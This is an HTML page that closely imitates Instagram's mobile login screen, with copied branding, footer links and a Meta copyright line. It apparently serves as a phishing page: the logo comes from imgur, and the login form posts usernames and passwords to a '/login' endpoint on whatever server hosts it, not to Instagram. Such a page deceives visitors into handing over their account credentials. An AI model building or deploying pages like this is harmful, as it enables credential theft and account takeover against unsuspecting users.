<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            line-height: 1.34;
            font-size: 14px;
            padding: 0;
            margin: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 16px;
            max-width: 400px;
            margin: 0 auto;
            width: 100%;
        }
        .header {
            text-align: center;
            margin: 40px 0 30px 0;
        }
        .logo {
            width: 175px;
            height: 51px;
            margin: 0 auto 20px auto;
            background-image: url('https://i.imgur.com/zqpwkLQ.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 16px;
            width: 100%;
        }
        .form-group {
            margin-bottom: 12px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border-radius: 4px;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            background: #fafafa;
            color: #262626;
            font-family: inherit;
        }
        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: #8e8e8e;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .login-btn {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            color: white;
            font-weight: bold;
            padding: 10px;
            width: 100%;
            margin-bottom: 16px;
            cursor: pointer;
            font-family: inherit;
            opacity: 0.7;
        }
        .login-btn:active {
            background-color: #0077c7;
            transform: scale(0.98);
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
        }
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }
        .divider::before {
            margin-right: 16px;
        }
        .divider::after {
            margin-left: 16px;
        }
        .facebook-login {
            color: #385185;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
        }
        .forgot-password {
            color: #00376b;
            text-align: center;
            display: block;
            text-decoration: none;
            font-size: 12px;
        }
        .signup-section {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            margin-bottom: 16px;
        }
        .signup-text {
            color: #262626;
            font-size: 14px;
        }
        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .get-app {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #262626;
            line-height: 1.5;
        }
        .app-buttons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }
        .app-button {
            height: 40px;
        }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: auto;
        }
        .footer-links {
            font-size: 12px;
            color: #8e8e8e;
            line-height: 1.6;
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #8e8e8e;
            text-decoration: none;
            margin: 0 6px;
        }
        .copyright {
            font-size: 12px;
            color: #8e8e8e;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo"></div>
        </div>

        <div class="card">
            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>

            <div class="divider">OR</div>

            <a href="#" class="facebook-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>

        <div class="signup-section">
            <span class="signup-text">Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>

        <div class="get-app">
            <div>Get the app.</div>
            <div class="app-buttons">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" class="app-button">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store" class="app-button">
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Threads</a>
            <a href="#">Contact Uploading & Non-Users</a>
            <a href="#">Meta Verified</a>
        </div>
        <div class="copyright">
            English (US) Â© 2025 Instagram from Meta
        </div>
    </div>
</body>
</html>
